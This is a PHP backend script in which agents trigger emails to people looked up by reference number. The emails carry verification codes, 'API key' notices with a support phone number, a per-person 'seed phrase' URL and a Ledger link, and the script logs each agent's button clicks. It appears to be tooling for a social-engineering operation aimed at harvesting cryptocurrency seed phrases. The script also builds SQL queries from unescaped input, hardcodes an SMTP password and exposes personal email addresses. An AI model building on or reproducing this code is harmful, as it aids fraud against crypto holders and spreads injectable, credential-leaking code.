<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');
date_default_timezone_set('Europe/London');

require __DIR__ . '/vendor/autoload.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require_once 'config/db_config.php';
require_once 'GoogleSheetsHelper.php';
require_once 'EmailHelper.php';

$action    = isset($_POST['action'])    ? trim($_POST['action'])    : '';
$reference = isset($_POST['reference']) ? trim($_POST['reference']) : '';
$agent     = isset($_POST['agent'])     ? trim($_POST['agent'])     : '';
$caller    = isset($_POST['caller'])    ? trim($_POST['caller'])    : '';

$todaydate = date('Y-m-d H:i:s');

if (empty($action) || empty($reference || empty($agent) || empty($caller))) {
    echo json_encode(['success' => false, 'error' => 'Missing required parameters']);
    exit;
}


try {
    $response = ['success' => true];

    switch ($action) {
        case 'verify':
            $response = handleVerifyAction($reference);
            break;

        case 'api_key':
            $response = handleApiKeyAction($reference);
            break;

        case 'api_key_cancel':
            $response = handleApiCancelAction($reference);
            break;

        case 'seed_phrase':
            $response = handleSeedPhraseAction($reference);
            break;

        case 'ledger':
            $response = handleLedgerAction($reference);
            break;

        case 'block':
            $response = handleBlockAction($reference);
            break;

        default:
            $response = ['success' => false, 'error' => 'Invalid action'];
    }
} catch (Exception $e) {
    $response = ['success' => false, 'error' => $e->getMessage()];
} finally {
    sendAlert();
}

echo json_encode($response);

function handleVerifyAction($reference)
{
    // Search for reference in Google Sheets
    $sheet = new GoogleSheetsHelper();
    $referenceData = $sheet->searchInSheet('Reference', $reference);

    if (empty($referenceData)) {
        return ['success' => false, 'error' => 'Reference not found'];
    }

    if (!isset($referenceData[0]['Email']) || empty($referenceData[0]['Email'])) {
        return ['success' => false, 'error' => 'Email not found for reference ' . $reference];
    } else {
        $email = $referenceData[0]['Email'];
    }

    // Generate or get verification code
    $verificationCode = generateVerificationCode();

    $emailHelper = new EmailHelper();
    $emailHelper->sendVerificationEmail($email, $verificationCode);

    logAction($reference);

    return [
        'success' => true,
        'verification_code' => $verificationCode,
        'message' => 'Verification code generated'

    ];
}

function handleApiKeyAction($reference)
{

    $sheet = new GoogleSheetsHelper();
    $referenceData = $sheet->searchInSheet('Reference', $reference);

    if (empty($referenceData)) {
        return ['success' => false, 'error' => 'Reference not found'];
    }

    if (!isset($referenceData[0]['Email']) || empty($referenceData[0]['Email'])) {
        return ['success' => false, 'error' => 'Email not found for reference ' . $reference];
    } else {
        $email = $referenceData[0]['Email'];
    }


    if (!isset($referenceData[0]['Support Phone Number']) || empty($referenceData[0]['Support Phone Number'])) {
        $supportPhone = '+61 26105933';
    } else {
        $supportPhone = $referenceData[0]['Support Phone Number'];
    }

    $emailHelper = new EmailHelper();
    $emailHelper->sendApiKeyNotification($email, $supportPhone);

    logAction($reference);

    return [
        'success' => true,
        'support_phone' => $supportPhone,
        'message' => 'API Key notification sent'
    ];
}

function handleApiCancelAction($reference)
{

    $sheet = new GoogleSheetsHelper();
    $referenceData = $sheet->searchInSheet('Reference', $reference);

    if (empty($referenceData)) {
        return ['success' => false, 'error' => 'Reference not found'];
    }

    if (!isset($referenceData[0]['Email']) || empty($referenceData[0]['Email'])) {
        return ['success' => false, 'error' => 'Email not found for reference ' . $reference];
    } else {
        $email = $referenceData[0]['Email'];
    }

    $emailHelper = new EmailHelper();
    $emailHelper->sendApiKeyCancellation($email);

    logAction($reference);

    return [
        'success' => true,
        'message' => 'API Key cancellation sent'
    ];
}

function handleSeedPhraseAction($reference)
{
    $seedUrl = "seed.com/" . strtolower($reference);

    $sheet = new GoogleSheetsHelper();
    $referenceData = $sheet->searchInSheet('Reference', $reference);

    if (empty($referenceData)) {
        return ['success' => false, 'error' => 'Reference not found'];
    }

    if (!isset($referenceData[0]['Email']) || empty($referenceData[0]['Email'])) {
        return ['success' => false, 'error' => 'Email not found for reference ' . $reference];
    } else {
        $email = $referenceData[0]['Email'];
    }

    $emailHelper = new EmailHelper();
    $emailHelper->sendSeedPhraseEmail($email, $seedUrl);

    logAction($reference);

    return [
        'success' => true,
        'seed_url' => $seedUrl,
        'message' => 'Seed phrase URL generated'
    ];
}

function handleLedgerAction($reference)
{
    $ledgerUrl = "ledger.com";

    $sheet = new GoogleSheetsHelper();
    $referenceData = $sheet->searchInSheet('Reference', $reference);

    if (empty($referenceData)) {
        return ['success' => false, 'error' => 'Reference not found'];
    }

    if (!isset($referenceData[0]['Email']) || empty($referenceData[0]['Email'])) {
        return ['success' => false, 'error' => 'Email not found for reference ' . $reference];
    } else {
        $email = $referenceData[0]['Email'];
    }

    $emailHelper = new EmailHelper();
    $emailHelper->sendLedgerEmail($email, $ledgerUrl);
    logAction($reference);

    return [
        'success' => true,
        'ledger_url' => $ledgerUrl,
        'message' => 'Ledger URL generated'
    ];
}

function handleBlockAction($reference)
{
    $sheet = new GoogleSheetsHelper();
    $referenceData = $sheet->searchInSheet('Reference', $reference);
    if (empty($referenceData)) {
        return ['success' => false, 'error' => 'Reference not found'];
    }

    logAction($reference);

    return [
        'success' => true,
        'message' => 'Reference blocked successfully'
    ];
}

function sendAlert()
{
    global $agent, $caller, $action, $todaydate;

    if (in_array($action, ['api_key', 'api_key_cancel', 'seed_phrase', 'ledger'], true)) {

        $action = str_replace('_', ' ', $action); 
        $action = ucwords($action); 

        $subject = "ALERT: {$action} clicked by {$agent}";
        $body = "Button  : {$action}\nAgent   : {$agent}\nReference  : {$caller}\nTime    : " . date('H:i:s d-m-Y');
        file_put_contents(date('Y-m-d') . "_emailphrase.txt", $body . PHP_EOL, FILE_APPEND);
        $emails = [];
        define('ALERT_FROM', 'santi@allsmartone.com');

        if ($agent !== '') {
            //$eAgent = mysqli_real_escape_string($conn, $agent);
            $conn = getDbConnection();

            $sql = " SELECT DISTINCT u.email FROM ausers a JOIN adminuser u ON a.adminid = u.id WHERE a.user = '$agent' OR u.role = 'owner' ";

            $result = mysqli_query($conn, $sql);
            while ($row = mysqli_fetch_assoc($result)) {
                $email = trim($row['email']);
                if ($email !== '') {
                    $emails[] = $email;
                }
            }
        }

        closeDbConnection($conn);

        if (empty($emails)) {
            $emails[] = 'gaurav.lokhande1706@gmail.com';  // fallback or default
        }
        $edata = sendEmail($emails, $subject, $body);
    }
}

function logAction($reference)
{
    $conn = getDbConnection();

    global $agent, $caller, $todaydate, $action;

    /* ---------- 1) INSERT INTO adminsmsdata ---------- */
    $sqlAdmin = "
    INSERT INTO adminsmsdata (agent, number, butclick, insertdate)
    VALUES ('$agent', '$caller', '$action','$todaydate')
    ";
    $okAdmin = mysqli_query($conn, $sqlAdmin);

    if (!$okAdmin) {

        file_put_contents(date('Y-m-d') . "_adminsqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
    }

    /* ---------- 2) TRANSFORM CALLER & INSERT ownersmsdata ---------- */
    $ownerCaller = '0' . substr(substr($caller, 3), 0, -1); // 0 + drop first 3 + drop last
    $eOwnerCaller = mysqli_real_escape_string($conn, $ownerCaller);

    if ($action === 'block') {
        $blockedNumber = substr(substr($caller, 3), 0, -1); // same transformation
        // $eBlockedNumber = mysqli_real_escape_string($conn, $blockedNumber);
        $eBlockedNumber = $caller;

        $sqlBlock = "
            INSERT INTO blocknum (number, agent)
            VALUES ('$eBlockedNumber', '$agent')
            ";
        $okBlock = mysqli_query($conn, $sqlBlock);

        if (!$okBlock) {
            file_put_contents(date('Y-m-d') . "_blocksqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
            //echo json_encode(['success' => false, 'message' => 'Action not triggered successfully']);
        }
    }

    $sqlOwner = "
        INSERT INTO ownersmsdata (agent, number, butclick,insertdate)
        VALUES ('$agent', '$caller', '$action','$todaydate')
        ";
    $okOwner = mysqli_query($conn, $sqlOwner);

    if (!$okOwner) {

        file_put_contents(date('Y-m-d') . "_adminsqlerror", date('H:i:s') . " _" . mysqli_error($conn) . PHP_EOL, FILE_APPEND);
    }

    closeDbConnection($conn);
}

function generateVerificationCode()
{
    return rand(100, 999) . '-' . rand(100, 999);
}

function sendEmail(array $emails, string $subject, string $body)
{
    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host       = 'smtp.hostinger.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = ALERT_FROM;
        $mail->Password   = 'Santi@4321';  // use env var in production
        $mail->SMTPSecure = 'ssl';
        $mail->Port       = 465;

        $mail->setFrom(ALERT_FROM, 'Alert Bot');

        // Add each email as a recipient
        foreach ($emails as $email) {
            $mail->addAddress($email);
        }

        $mail->Subject = $subject;
        $mail->Body    = $body;

        $mail->send();

    } catch (Exception $e) {
        $errorMsg = "[" . date('Y-m-d H:i:s') . "] Email failed: " . $mail->ErrorInfo . "\n";
    }
}

